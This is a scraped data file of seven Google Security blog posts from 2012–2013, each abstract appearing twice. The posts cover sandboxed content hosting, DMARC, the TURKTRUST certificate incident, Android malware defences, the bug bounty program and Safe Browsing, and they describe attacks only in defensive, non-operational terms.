{"website": "Google-Security", "title": "\nContent hosting for the modern web\n", "author": ["Posted by Michal Zalewski, Security Team"], "link": "https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html", "abstract": "                             Posted by Michal Zalewski, Security Team     Our applications host a variety of web content on behalf of our users, and over the years we learned that even something as simple as serving a profile image can be surprisingly fraught with pitfalls. Today, we wanted to share some of our findings about content hosting, along with the approaches we developed to mitigate the risks.    Historically, all browsers and browser plugins were designed simply to excel at displaying several common types of web content, and to be tolerant of any mistakes made by website owners. In the days of static HTML and simple web applications, giving the owner of the domain authoritative control over how the content is displayed wasn&#8217;t of any importance.    It wasn&#8217;t until the mid-2000s that we started to notice a problem: a clever attacker could manipulate the browser into interpreting seemingly harmless images or text documents as HTML, Java, or Flash&#8212;thus gaining the ability to execute malicious scripts in the  security context  of the application displaying these documents (essentially, a  cross-site scripting flaw ). For all the increasingly sensitive web applications, this was very bad news.    During the past few years, modern browsers began to improve. For example, the browser vendors limited the amount of second-guessing performed on text documents, certain types of images, and unknown MIME types. However, there are many standards-enshrined design decisions&#8212;such as ignoring MIME information on any content loaded through  &lt;object&gt;  ,  &lt;embed&gt;  , or  &lt;applet&gt;  &#8212;that are much more difficult to fix; these practices may lead to vulnerabilities similar to the  GIFAR bug .    Google&#8217;s security team played an active role in investigating and remediating many content sniffing vulnerabilities during this period. In fact, many of the enforcement proposals were first prototyped in Chrome. Even still, the overall progress is slow; for every resolved problem, researchers discover a previously unknown flaw in another browser mechanism. Two recent examples are the Byte Order Mark (BOM) vulnerability reported to us by Masato Kinugawa, or the  MHTML attacks  that we have seen happening in the wild.    For a while, we focused on content sanitization as a possible workaround - but in many cases, we found it to be insufficient. For example, Aleksandr Dobkin managed to construct a purely alphanumeric Flash applet, and in our internal work the Google security team created images that can be forced to include a particular plaintext string in their body, after being scrubbed and recoded in a deterministic way.    In the end, we reacted to this raft of content hosting problems by placing some of the high-risk content in separate, isolated  web origins &#8212;most commonly  *.googleusercontent.com . There, the &#8220;sandboxed&#8221; files pose virtually no threat to the applications themselves, or to google.com authentication cookies. For public content, that&#8217;s all we need: we may use random or user-specific subdomains, depending on the degree of isolation required between unrelated documents, but otherwise the solution just works.    The situation gets more interesting for non-public documents, however. Copying users&#8217; normal authentication cookies to the &#8220;sandbox&#8221; domain would defeat the purpose. The natural alternative is to move the secret token used to confer access rights from the  Cookie  header to a value embedded in the URL, and make the token unique to every document instead of keeping it global.    While this solution eliminates many of the  significant design flaws  associated with HTTP cookies, it trades one imperfect authentication mechanism for another. In particular, it&#8217;s important to note there are more ways to accidentally leak a capability-bearing URL than there are to accidentally leak cookies; the most notable risk is disclosure through the  Referer  header for any document format capable of including external subresources or of linking to external sites.    In our applications, we take a risk-based approach. Generally speaking, we tend to use three strategies:     In higher risk situations (e.g. documents with elevated risk of URL disclosure), we may couple the URL token scheme with short-lived, document-specific cookies issued for specific subdomains of  googleusercontent.com . This mechanism, known within Google as  FileComp , relies on a range of attack mitigation strategies that are too disruptive for Google applications at large, but work well in this highly constrained use case.       In cases where the risk of leaks is limited but responsive access controls are preferable (e.g., embedded images), we may issue URLs bound to a specific user, or ones that expire quickly.       In low-risk scenarios, where usability requirements necessitate a more balanced approach, we may opt for globally valid, longer-lived URLs.    Of course, the research into the security of web browsers continues, and the landscape of web applications is evolving rapidly. We are constantly tweaking our solutions to protect Google users even better, and even the solutions described here may change. Our commitment to making the Internet a safer place, however, will never waver.                                   Posted by Michal Zalewski, Security Team  Our applications host a variety of web content on behalf of our users, and over the years we learned that even something as simple as serving a profile image can be surprisingly fraught with pitfalls. Today, we wanted to share some of our findings about content hosting, along with the approaches we developed to mitigate the risks.  Historically, all browsers and browser plugins were designed simply to excel at displaying several common types of web content, and to be tolerant of any mistakes made by website owners. In the days of static HTML and simple web applications, giving the owner of the domain authoritative control over how the content is displayed wasn’t of any importance.  It wasn’t until the mid-2000s that we started to notice a problem: a clever attacker could manipulate the browser into interpreting seemingly harmless images or text documents as HTML, Java, or Flash—thus gaining the ability to execute malicious scripts in the security context of the application displaying these documents (essentially, a cross-site scripting flaw). For all the increasingly sensitive web applications, this was very bad news.  During the past few years, modern browsers began to improve. For example, the browser vendors limited the amount of second-guessing performed on text documents, certain types of images, and unknown MIME types. However, there are many standards-enshrined design decisions—such as ignoring MIME information on any content loaded through   ,   , or   —that are much more difficult to fix; these practices may lead to vulnerabilities similar to the GIFAR bug.  Google’s security team played an active role in investigating and remediating many content sniffing vulnerabilities during this period. In fact, many of the enforcement proposals were first prototyped in Chrome. Even still, the overall progress is slow; for every resolved problem, researchers discover a previously unknown flaw in another browser mechanism. Two recent examples are the Byte Order Mark (BOM) vulnerability reported to us by Masato Kinugawa, or the MHTML attacks that we have seen happening in the wild.  For a while, we focused on content sanitization as a possible workaround - but in many cases, we found it to be insufficient. For example, Aleksandr Dobkin managed to construct a purely alphanumeric Flash applet, and in our internal work the Google security team created images that can be forced to include a particular plaintext string in their body, after being scrubbed and recoded in a deterministic way.  In the end, we reacted to this raft of content hosting problems by placing some of the high-risk content in separate, isolated web origins—most commonly *.googleusercontent.com. There, the “sandboxed” files pose virtually no threat to the applications themselves, or to google.com authentication cookies. For public content, that’s all we need: we may use random or user-specific subdomains, depending on the degree of isolation required between unrelated documents, but otherwise the solution just works.  The situation gets more interesting for non-public documents, however. Copying users’ normal authentication cookies to the “sandbox” domain would defeat the purpose. The natural alternative is to move the secret token used to confer access rights from the Cookie header to a value embedded in the URL, and make the token unique to every document instead of keeping it global.  While this solution eliminates many of the significant design flaws associated with HTTP cookies, it trades one imperfect authentication mechanism for another. In particular, it’s important to note there are more ways to accidentally leak a capability-bearing URL than there are to accidentally leak cookies; the most notable risk is disclosure through the Referer header for any document format capable of including external subresources or of linking to external sites.  In our applications, we take a risk-based approach. Generally speaking, we tend to use three strategies:  In higher risk situations (e.g. documents with elevated risk of URL disclosure), we may couple the URL token scheme with short-lived, document-specific cookies issued for specific subdomains of googleusercontent.com. This mechanism, known within Google as FileComp, relies on a range of attack mitigation strategies that are too disruptive for Google applications at large, but work well in this highly constrained use case.   In cases where the risk of leaks is limited but responsive access controls are preferable (e.g., embedded images), we may issue URLs bound to a specific user, or ones that expire quickly.   In low-risk scenarios, where usability requirements necessitate a more balanced approach, we may opt for globally valid, longer-lived URLs.  Of course, the research into the security of web browsers continues, and the landscape of web applications is evolving rapidly. We are constantly tweaking our solutions to protect Google users even better, and even the solutions described here may change. Our commitment to making the Internet a safer place, however, will never waver.     ", "date": "August 29, 2012"},
{"website": "Google-Security", "title": "\nLanding another blow against email phishing\n", "author": ["Posted by Adam Dawes, Product Manager"], "link": "https://security.googleblog.com/2012/01/landing-another-blow-against-email.html", "abstract": "                               (Cross-posted from the  Gmail Blog )         Posted by Adam Dawes, Product Manager   Email phishing, in which someone tries to trick you into revealing personal information by sending fake emails that look legitimate, remains one of the biggest online threats. One of the most popular methods that scammers employ is something called  domain spoofing . With this technique, someone sends a message that seems legitimate when you look at the &#8220;From&#8221; line even though it&#8217;s actually a fake. Email phishing is costing regular people and companies millions of dollars each year, if not more, and in response, Google and other companies have been talking about how we can move beyond the solutions we&#8217;ve developed individually over the years to make a real difference for the whole email industry.  Industry groups come and go, and it&#8217;s not always easy to tell at the beginning which ones are actually going to generate good solutions. When the right contributors come together to solve real problems, though, real things happen. That&#8217;s why we&#8217;re particularly optimistic about  today&#8217;s announcement  of DMARC.org, a passionate collection of companies focused on significantly cutting down on email phishing and other malicious mail.  Building upon the work of previous mail authentication standards like  SPF  and  DKIM , DMARC is responding to domain spoofing and other phishing methods by creating a standard protocol by which we&#8217;ll be able to measure and enforce the authenticity of emails. With DMARC, large email senders can ensure that the email they send is being recognized by mail providers like Gmail as legitimate, as well as set policies so that mail providers can reject messages that try to spoof the senders&#8217; addresses.  We&#8217;ve been active in the leadership of the DMARC group for almost two years, and now that Gmail and several other large mail senders and providers &#8212; namely Facebook, LinkedIn, and PayPal &#8212; are actively using the DMARC specification, the road is paved for more members of the email ecosystem to start getting a handle on phishing. Our recent data indicates that roughly 15% of non-spam messages in Gmail are already coming from domains protected by DMARC, which means Gmail users like you don&#8217;t need to worry about spoofed messages from these senders. The phishing potential plummets when the system just works, and that&#8217;s what DMARC provides.  If you&#8217;re a large email sender and you want to try out the DMARC specification, you can learn more at the  DMARC website . Even if you&#8217;re not ready to take on the challenge of authenticating all your outbound mail just yet, there&#8217;s no reason to not sign up to start receiving reports of mail that fraudulently claims to originate from your address. With further adoption of DMARC, we can all look forward to a more trustworthy overall experience with email.                                   (Cross-posted from the Gmail Blog)Posted by Adam Dawes, Product ManagerEmail phishing, in which someone tries to trick you into revealing personal information by sending fake emails that look legitimate, remains one of the biggest online threats. One of the most popular methods that scammers employ is something called domain spoofing. With this technique, someone sends a message that seems legitimate when you look at the “From” line even though it’s actually a fake. Email phishing is costing regular people and companies millions of dollars each year, if not more, and in response, Google and other companies have been talking about how we can move beyond the solutions we’ve developed individually over the years to make a real difference for the whole email industry.Industry groups come and go, and it’s not always easy to tell at the beginning which ones are actually going to generate good solutions. When the right contributors come together to solve real problems, though, real things happen. That’s why we’re particularly optimistic about today’s announcement of DMARC.org, a passionate collection of companies focused on significantly cutting down on email phishing and other malicious mail.Building upon the work of previous mail authentication standards like SPF and DKIM, DMARC is responding to domain spoofing and other phishing methods by creating a standard protocol by which we’ll be able to measure and enforce the authenticity of emails. With DMARC, large email senders can ensure that the email they send is being recognized by mail providers like Gmail as legitimate, as well as set policies so that mail providers can reject messages that try to spoof the senders’ addresses.We’ve been active in the leadership of the DMARC group for almost two years, and now that Gmail and several other large mail senders and providers — namely Facebook, LinkedIn, and PayPal — are actively using the DMARC specification, the road is paved for more members of the email ecosystem to start getting a handle on phishing. Our recent data indicates that roughly 15% of non-spam messages in Gmail are already coming from domains protected by DMARC, which means Gmail users like you don’t need to worry about spoofed messages from these senders. The phishing potential plummets when the system just works, and that’s what DMARC provides.If you’re a large email sender and you want to try out the DMARC specification, you can learn more at the DMARC website. Even if you’re not ready to take on the challenge of authenticating all your outbound mail just yet, there’s no reason to not sign up to start receiving reports of mail that fraudulently claims to originate from your address. With further adoption of DMARC, we can all look forward to a more trustworthy overall experience with email.     ", "date": "January 29, 2012"},
{"website": "Google-Security", "title": "\nEnhancing digital certificate security\n", "author": ["Posted by Adam Langley, Software Engineer"], "link": "https://security.googleblog.com/2013/01/enhancing-digital-certificate-security.html", "abstract": "                             Posted by Adam Langley, Software Engineer     Late on December 24, Chrome detected and blocked an unauthorized digital certificate for the \"*.google.com\" domain. We investigated immediately and found the certificate was issued by an  intermediate certificate authority  (CA) linking back to TURKTRUST, a Turkish certificate authority. Intermediate CA certificates carry the full authority of the CA, so anyone who has one can use it to create a certificate for any website they wish to impersonate.     In response, we updated Chrome&#8217;s certificate revocation metadata on December 25 to block that intermediate CA, and then alerted TURKTRUST and other browser vendors. TURKTRUST told us that based on our information, they discovered that, in August 2011, they had mistakenly issued two intermediate CA certificates to organizations that should have instead received regular SSL certificates. On December 26, we pushed another Chrome metadata update to block the second mistaken CA certificate and informed the other browser vendors.     Our actions addressed the immediate problem for our users. Given the severity of the situation, we will update Chrome again in January to no longer indicate Extended Validation status for certificates issued by TURKTRUST, though connections to TURKTRUST-validated HTTPS servers may continue to be allowed.    Since our priority is the security and privacy of our users, we may also decide to take additional action after further discussion and careful consideration.                                    Posted by Adam Langley, Software Engineer  Late on December 24, Chrome detected and blocked an unauthorized digital certificate for the \"*.google.com\" domain. We investigated immediately and found the certificate was issued by an intermediate certificate authority (CA) linking back to TURKTRUST, a Turkish certificate authority. Intermediate CA certificates carry the full authority of the CA, so anyone who has one can use it to create a certificate for any website they wish to impersonate.   In response, we updated Chrome’s certificate revocation metadata on December 25 to block that intermediate CA, and then alerted TURKTRUST and other browser vendors. TURKTRUST told us that based on our information, they discovered that, in August 2011, they had mistakenly issued two intermediate CA certificates to organizations that should have instead received regular SSL certificates. On December 26, we pushed another Chrome metadata update to block the second mistaken CA certificate and informed the other browser vendors.   Our actions addressed the immediate problem for our users. Given the severity of the situation, we will update Chrome again in January to no longer indicate Extended Validation status for certificates issued by TURKTRUST, though connections to TURKTRUST-validated HTTPS servers may continue to be allowed.  Since our priority is the security and privacy of our users, we may also decide to take additional action after further discussion and careful consideration.      ", "date": "January 3, 2013"},
{"website": "Google-Security", "title": "\nAndroid and Security\n", "author": ["Posted by Adrian Ludwig, Android Security Engineer"], "link": "https://security.googleblog.com/2012/02/android-and-security.html", "abstract": "                             Posted by Adrian Ludwig, Android Security Engineer   We frequently get asked about how we defend Android users from malware and other threats. As the Android platform continues its tremendous growth, people wonder how we can maintain a trustworthy experience with Android Market while preserving the openness that remains a hallmark of our overall approach. We&#8217;ve been working on lots of defenses, and they have already made a real and measurable difference for our users&#8217; security. Read more about how we defend against malware in Android Market on the Google Mobile Blog  here .                                   Posted by Adrian Ludwig, Android Security EngineerWe frequently get asked about how we defend Android users from malware and other threats. As the Android platform continues its tremendous growth, people wonder how we can maintain a trustworthy experience with Android Market while preserving the openness that remains a hallmark of our overall approach. We’ve been working on lots of defenses, and they have already made a real and measurable difference for our users’ security. Read more about how we defend against malware in Android Market on the Google Mobile Blog here.     ", "date": "February 2, 2012"},
{"website": "Google-Security", "title": "\nCelebrating one year of web vulnerability research\n", "author": ["Posted by Adam Mein, Technical Program Manager, Google Security Team"], "link": "https://security.googleblog.com/2012/02/celebrating-one-year-of-web.html", "abstract": "                             Posted by Adam Mein, Technical Program Manager, Google Security Team   In November 2010, we  introduced  a different kind of vulnerability reward program that encourages people to find and report security bugs in Google&#8217;s web applications. By all available measures, the program has been a big success. Before we embark further, we wanted to pause and share a few things that we&#8217;ve learned from the experience.   &#8220;Bug bounty&#8221; programs open up vulnerability research to wider participation.   On the morning of our announcement of the program last November, several of us guessed how many valid reports we might see during the first week. Thanks to an already successful  Chromium reward program  and a healthy stream of regular contributions to our  general security submissions  queue, most estimates settled around 10 or so. At the end of the first week, we ended up with 43 bug reports. Over the course of the program, we&#8217;ve seen more than 1100 legitimate issues (ranging from low severity to higher)  reported by over 200 individuals , with 730 of those bugs qualifying for a reward. Roughly half of the bugs that received a reward were discovered in software written by approximately 50 companies that Google acquired; the rest were distributed across applications developed by Google (several hundred new ones each year). Significantly, the vast majority of our initial bug reporters had never filed bugs with us before we started offering monetary rewards.   Developing quality bug reports pays off... for everyone.   A well-run vulnerability reward program attracts high quality reports, and we&#8217;ve seen a whole lot of them. To date we&#8217;ve paid out over $410,000 for web app vulnerabilities to directly support researchers and their efforts. Thanks to the generosity of these bug reporters, we have also donated $19,000 to charities of their choice. It&#8217;s not all about money, though. Google has gotten better and stronger as a result of this work. We get more bug reports, which means we get more bug fixes, which means a safer experience for our users.   Bug bounties &#8212; the more, the merrier!   We benefited from looking at  examples  of other types of vulnerability reward programs when designing our own. Similarly, in the months following our reward program kick-off, we saw  other   companies  developing reward programs and starting to  focus more on web properties . Over time, these programs can help companies build better relationships with the security research community. As the model replicates, the opportunity to improve the overall security of the web broadens.  And with that, we turn toward the year ahead. We&#8217;re looking forward to new reports and ongoing relationships with the researchers who are helping make Google products more secure.                                   Posted by Adam Mein, Technical Program Manager, Google Security TeamIn November 2010, we introduced a different kind of vulnerability reward program that encourages people to find and report security bugs in Google’s web applications. By all available measures, the program has been a big success. Before we embark further, we wanted to pause and share a few things that we’ve learned from the experience.“Bug bounty” programs open up vulnerability research to wider participation.On the morning of our announcement of the program last November, several of us guessed how many valid reports we might see during the first week. Thanks to an already successful Chromium reward program and a healthy stream of regular contributions to our general security submissions queue, most estimates settled around 10 or so. At the end of the first week, we ended up with 43 bug reports. Over the course of the program, we’ve seen more than 1100 legitimate issues (ranging from low severity to higher) reported by over 200 individuals, with 730 of those bugs qualifying for a reward. Roughly half of the bugs that received a reward were discovered in software written by approximately 50 companies that Google acquired; the rest were distributed across applications developed by Google (several hundred new ones each year). Significantly, the vast majority of our initial bug reporters had never filed bugs with us before we started offering monetary rewards.Developing quality bug reports pays off... for everyone.A well-run vulnerability reward program attracts high quality reports, and we’ve seen a whole lot of them. To date we’ve paid out over $410,000 for web app vulnerabilities to directly support researchers and their efforts. Thanks to the generosity of these bug reporters, we have also donated $19,000 to charities of their choice. It’s not all about money, though. Google has gotten better and stronger as a result of this work. We get more bug reports, which means we get more bug fixes, which means a safer experience for our users.Bug bounties — the more, the merrier!We benefited from looking at examples of other types of vulnerability reward programs when designing our own. Similarly, in the months following our reward program kick-off, we saw other companies developing reward programs and starting to focus more on web properties. Over time, these programs can help companies build better relationships with the security research community. As the model replicates, the opportunity to improve the overall security of the web broadens.And with that, we turn toward the year ahead. We’re looking forward to new reports and ongoing relationships with the researchers who are helping make Google products more secure.     ", "date": "February 9, 2012"},
{"website": "Google-Security", "title": "\nTech tips that are Good to Know\n", "author": ["Posted by Alma Whitten, Director of Privacy, Product and Engineering"], "link": "https://security.googleblog.com/2012/01/tech-tips-that-are-good-to-know.html", "abstract": "                             Posted by Alma Whitten, Director of Privacy, Product and Engineering    (Cross-posted from the  Official Google Blog )   Does this person sound familiar? He can&#8217;t be bothered to type a password into his phone every time he wants to play a game of Angry Birds. When he does need a password, maybe for his email or bank website, he chooses one that&#8217;s easy to remember like his sister&#8217;s name&#8212;and he uses the same one for each website he visits. For him, cookies come from the bakery, IP addresses are the locations of Intellectual Property and a correct Google search result is basically magic.  Most of us know someone like this. Technology can be confusing, and the industry often fails to explain clearly enough why digital literacy matters. So today in the U.S. we&#8217;re kicking off  Good to Know , our biggest-ever consumer education campaign focused on making the web a safer, more comfortable place. Our ad campaign, which we introduced in the U.K. and Germany last fall, offers privacy and security tips: Use  2-step verification ! Remember to lock your computer when you step away! Make sure your connection to a website is  secure ! It also  explains  some of the building blocks of the web like cookies and IP addresses. Keep an eye out for the ads in newspapers and magazines, online and in New York and Washington, D.C. subway stations.      The campaign and  Good to Know website  build on our commitment to keeping people safe online. We&#8217;ve created resources like  privacy videos , the  Google Security Center , the  Family Safety Center  and  Teach Parents Tech  to help you develop strong privacy and security habits. We design for privacy, building tools like  Google Dashboard ,  Me on the Web , the  Ads Preferences Manager  and  Google+ Circles &#8212;with more on the way.  We encourage you to take a few minutes to check out the  Good to Know site , watch  some   of   the   videos , and be on the lookout for ads in your favorite newspaper or website. We hope you&#8217;ll learn something new about how to protect yourself online&#8212;tips that are always good to know!      Update  1/17 : Updated to include more background on Good to Know.                                    Posted by Alma Whitten, Director of Privacy, Product and Engineering(Cross-posted from the Official Google Blog)Does this person sound familiar? He can’t be bothered to type a password into his phone every time he wants to play a game of Angry Birds. When he does need a password, maybe for his email or bank website, he chooses one that’s easy to remember like his sister’s name—and he uses the same one for each website he visits. For him, cookies come from the bakery, IP addresses are the locations of Intellectual Property and a correct Google search result is basically magic.Most of us know someone like this. Technology can be confusing, and the industry often fails to explain clearly enough why digital literacy matters. So today in the U.S. we’re kicking off Good to Know, our biggest-ever consumer education campaign focused on making the web a safer, more comfortable place. Our ad campaign, which we introduced in the U.K. and Germany last fall, offers privacy and security tips: Use 2-step verification! Remember to lock your computer when you step away! Make sure your connection to a website is secure! It also explains some of the building blocks of the web like cookies and IP addresses. Keep an eye out for the ads in newspapers and magazines, online and in New York and Washington, D.C. subway stations.The campaign and Good to Know website build on our commitment to keeping people safe online. We’ve created resources like privacy videos, the Google Security Center, the Family Safety Center and Teach Parents Tech to help you develop strong privacy and security habits. We design for privacy, building tools like Google Dashboard, Me on the Web, the Ads Preferences Manager and Google+ Circles—with more on the way.We encourage you to take a few minutes to check out the Good to Know site, watch some of the videos, and be on the lookout for ads in your favorite newspaper or website. We hope you’ll learn something new about how to protect yourself online—tips that are always good to know!Update 1/17: Updated to include more background on Good to Know.     ", "date": "January 16, 2012"},
{"website": "Google-Security", "title": "\nSafe Browsing - Protecting Web Users for 5 Years and Counting\n", "author": ["Posted by Niels Provos, Security Team"], "link": "https://security.googleblog.com/2012/06/safe-browsing-protecting-web-users-for.html", "abstract": "                             Posted by Niels Provos, Security Team       It&#8217;s been five years since we officially announced  malware and phishing protection  via our Safe Browsing effort. The goal of Safe Browsing is still the same today as it was five years ago: to protect people from malicious content on the Internet. Today, this protection extends not only to Google&#8217;s search results and ads, but also to popular web browsers such as Chrome, Firefox and Safari.    To achieve comprehensive and timely detection of new threats, the Safe Browsing team at Google has labored continuously to adapt to rising challenges and to build an infrastructure that automatically detects harmful content around the globe.     For a quick sense of the scale of our effort:      We protect 600 million users through built-in protection for Chrome, Firefox, and Safari, where we show several million warnings every day to Internet users.  You may have seen our telltale red warnings pop up &#8212; when you do, please don&#8217;t go to sites we've flagged for malware or phishing. Our free and public  Safe Browsing API  allows other organizations to keep their users safe by using the data we&#8217;ve compiled.    We find about 9,500 new malicious websites every day.  These are either innocent websites that have been compromised by malware authors, or others that are built specifically for malware distribution or phishing. While we flag many sites daily, we strive for high quality and have had only a handful of false positives.    Approximately 12-14 million Google Search queries per day show our warning  to caution users from going to sites that are currently compromised. Once a site has been cleaned up, the warning is lifted.    We provide malware warnings for about 300 thousand downloads per day  through our  download protection service  for Chrome.    We send thousands of notifications daily to webmasters.  Signing up with  Webmaster Tools  helps us communicate directly with webmasters when we find something on their site, and our ongoing partnership with  StopBadware.org  helps webmasters who can't sign up or need additional help.    We also send thousands of notifications daily to Internet Service Providers (ISPs) &amp;  CERTs   to help them keep their networks clean.  Network administrators can sign up  to receive frequent alerts.    By protecting Internet users, webmasters, ISPs, and Google over the years, we've built up a steadily more sophisticated understanding of web-based malware and phishing. These aren&#8217;t completely solvable problems because threats continue to evolve, but our technologies and processes do, too.     From here we&#8217;ll try to hit a few highlights from our journey.        Phishing     Many phishers go right for the money, and that pattern is reflected in the continued heavy targeting of online commerce sites like eBay &amp; PayPal. Even though we&#8217;re still seeing some of the same techniques we first saw 5+ years ago, since they unfortunately still catch victims, phishing attacks are also getting more creative and sophisticated. As they evolve, we improve our system to catch more and newer attacks (Chart 1).  Modern attacks are:      Faster  - Many phishing webpages (URLs) remain online for less than an hour in an attempt to avoid detection.    More diverse  - Targeted &#8220;spear phishing&#8221; attacks have become increasingly common.  Additionally, phishing attacks are now targeting companies, banks, and merchants globally (Chart 2).    Used to distribute malware  - Phishing sites commonly use the look and feel of popular sites and social networks to trick users into installing malware.  For example, these rogue sites may ask to install a binary or browser extension to enable certain fake content.             (Chart 1)             (Chart 2)     Malware      Safe Browsing identifies two main categories of websites that may harm visitors:     Legitimate websites that are compromised in large numbers so they can deliver or redirect to malware (Chart 3).   Attack websites that are specifically built to distribute malware are used in increasing numbers (Chart 4).    When a legitimate website is compromised, it&#8217;s usually modified to include content from an attack site or to redirect to an attack site. These attack sites will often deliver \" Drive by downloads \" to visitors. A drive by download exploits a vulnerability in the browser to execute a malicious program on a user's computer without their knowledge.      Drive by downloads install and run a variety of malicious programs, such as:     Spyware to gather information like your banking credentials.   Malware that uses your computer to send spam.             (Chart 3)    Attack sites are purposely built for distributing malware and try to avoid detection by services such as Safe Browsing. To do so, they adopt several techniques, such as rapidly changing their location through free web hosting, dynamic DNS records, and automated generation of new domain names (Chart 4).             (Chart 4)    As companies have designed browsers and plugins to be more secure over time, malware purveyors have also employed social engineering, where the malware author tries to deceive the user into installing malicious software without the need for any software vulnerabilities. A good example is a &#8220;Fake Anti-Virus&#8221; alert that masquerades as a legitimate security warning, but it actually infects computers with malware.     While we see socially engineered attacks still trailing behind drive by downloads in frequency, this is a fast-growing category likely due to improved browser security.       How can you help prevent malware and phishing?     Our system is designed to protect users at high volumes (Chart 5), yet here are a few things that you can do to help:      Don't ignore our warnings.  Legitimate sites are commonly modified to contain malware or phishing threats until the webmaster has cleaned their site.  Malware is often designed to not be seen, so you won't know if your computer becomes infected. It&#8217;s best to wait for the warning to be removed before potentially exposing your machine to a harmful infection.    Help us find bad sites.  Chrome users can select the check box on the red warning page. The data sent to us helps us find bad sites more quickly and helps protect other users.    Register your website  with  Google Webmaster Tools . Doing so helps us inform you quickly if we find suspicious code on your website at any point.               (Chart 5)     Looking Forward     The threat landscape changes rapidly. Our adversaries are highly motivated by making money from unsuspecting victims, and at great cost to everyone involved.      Our tangible impact in making the web more secure and our ability to directly protect users from harm has been a great source of motivation for everyone on the Safe Browsing team. We are also happy that our free data feed has become the de facto base of comparison for academic research in this space.    As we look forward, Google continues to invest heavily in the Safe Browsing team, enabling us to counter newer forms of abuse.  In particular, our team supplied the technology underpinning these recent efforts:     Instantaneous  phishing detection and download protection  within the Chrome browser   Chrome extension malware scanning   Android application protection    For their strong efforts over the years, I thank Panayiotis Mavrommatis, Brian Ryner, Lucas Ballard, Moheeb Abu Rajab, Fabrice Jaubert, Nav Jagpal, Ian Fette, along with the whole Safe Browsing Team.                                   Posted by Niels Provos, Security Team    It’s been five years since we officially announced malware and phishing protection via our Safe Browsing effort. The goal of Safe Browsing is still the same today as it was five years ago: to protect people from malicious content on the Internet. Today, this protection extends not only to Google’s search results and ads, but also to popular web browsers such as Chrome, Firefox and Safari.  To achieve comprehensive and timely detection of new threats, the Safe Browsing team at Google has labored continuously to adapt to rising challenges and to build an infrastructure that automatically detects harmful content around the globe.   For a quick sense of the scale of our effort:  We protect 600 million users through built-in protection for Chrome, Firefox, and Safari, where we show several million warnings every day to Internet users. You may have seen our telltale red warnings pop up — when you do, please don’t go to sites we've flagged for malware or phishing. Our free and public Safe Browsing API allows other organizations to keep their users safe by using the data we’ve compiled. We find about 9,500 new malicious websites every day. These are either innocent websites that have been compromised by malware authors, or others that are built specifically for malware distribution or phishing. While we flag many sites daily, we strive for high quality and have had only a handful of false positives. Approximately 12-14 million Google Search queries per day show our warning to caution users from going to sites that are currently compromised. Once a site has been cleaned up, the warning is lifted. We provide malware warnings for about 300 thousand downloads per day through our download protection service for Chrome. We send thousands of notifications daily to webmasters. Signing up with Webmaster Tools helps us communicate directly with webmasters when we find something on their site, and our ongoing partnership with StopBadware.org helps webmasters who can't sign up or need additional help. We also send thousands of notifications daily to Internet Service Providers (ISPs) & CERTs to help them keep their networks clean. Network administrators can sign up to receive frequent alerts.  By protecting Internet users, webmasters, ISPs, and Google over the years, we've built up a steadily more sophisticated understanding of web-based malware and phishing. These aren’t completely solvable problems because threats continue to evolve, but our technologies and processes do, too.   From here we’ll try to hit a few highlights from our journey.    Phishing  Many phishers go right for the money, and that pattern is reflected in the continued heavy targeting of online commerce sites like eBay & PayPal. Even though we’re still seeing some of the same techniques we first saw 5+ years ago, since they unfortunately still catch victims, phishing attacks are also getting more creative and sophisticated. As they evolve, we improve our system to catch more and newer attacks (Chart 1).  Modern attacks are:  Faster - Many phishing webpages (URLs) remain online for less than an hour in an attempt to avoid detection. More diverse - Targeted “spear phishing” attacks have become increasingly common.  Additionally, phishing attacks are now targeting companies, banks, and merchants globally (Chart 2). Used to distribute malware - Phishing sites commonly use the look and feel of popular sites and social networks to trick users into installing malware.  For example, these rogue sites may ask to install a binary or browser extension to enable certain fake content.     (Chart 1)     (Chart 2)  Malware   Safe Browsing identifies two main categories of websites that may harm visitors:  Legitimate websites that are compromised in large numbers so they can deliver or redirect to malware (Chart 3). Attack websites that are specifically built to distribute malware are used in increasing numbers (Chart 4).  When a legitimate website is compromised, it’s usually modified to include content from an attack site or to redirect to an attack site. These attack sites will often deliver \"Drive by downloads\" to visitors. A drive by download exploits a vulnerability in the browser to execute a malicious program on a user's computer without their knowledge.    Drive by downloads install and run a variety of malicious programs, such as:  Spyware to gather information like your banking credentials. Malware that uses your computer to send spam.     (Chart 3)  Attack sites are purposely built for distributing malware and try to avoid detection by services such as Safe Browsing. To do so, they adopt several techniques, such as rapidly changing their location through free web hosting, dynamic DNS records, and automated generation of new domain names (Chart 4).     (Chart 4)  As companies have designed browsers and plugins to be more secure over time, malware purveyors have also employed social engineering, where the malware author tries to deceive the user into installing malicious software without the need for any software vulnerabilities. A good example is a “Fake Anti-Virus” alert that masquerades as a legitimate security warning, but it actually infects computers with malware.   While we see socially engineered attacks still trailing behind drive by downloads in frequency, this is a fast-growing category likely due to improved browser security.   How can you help prevent malware and phishing?  Our system is designed to protect users at high volumes (Chart 5), yet here are a few things that you can do to help:  Don't ignore our warnings. Legitimate sites are commonly modified to contain malware or phishing threats until the webmaster has cleaned their site.  Malware is often designed to not be seen, so you won't know if your computer becomes infected. It’s best to wait for the warning to be removed before potentially exposing your machine to a harmful infection. Help us find bad sites. Chrome users can select the check box on the red warning page. The data sent to us helps us find bad sites more quickly and helps protect other users. Register your website with Google Webmaster Tools. Doing so helps us inform you quickly if we find suspicious code on your website at any point.      (Chart 5)  Looking Forward  The threat landscape changes rapidly. Our adversaries are highly motivated by making money from unsuspecting victims, and at great cost to everyone involved.    Our tangible impact in making the web more secure and our ability to directly protect users from harm has been a great source of motivation for everyone on the Safe Browsing team. We are also happy that our free data feed has become the de facto base of comparison for academic research in this space.  As we look forward, Google continues to invest heavily in the Safe Browsing team, enabling us to counter newer forms of abuse.  In particular, our team supplied the technology underpinning these recent efforts:  Instantaneous phishing detection and download protection within the Chrome browser Chrome extension malware scanning Android application protection  For their strong efforts over the years, I thank Panayiotis Mavrommatis, Brian Ryner, Lucas Ballard, Moheeb Abu Rajab, Fabrice Jaubert, Nav Jagpal, Ian Fette, along with the whole Safe Browsing Team.     ", "date": "June 19, 2012"},
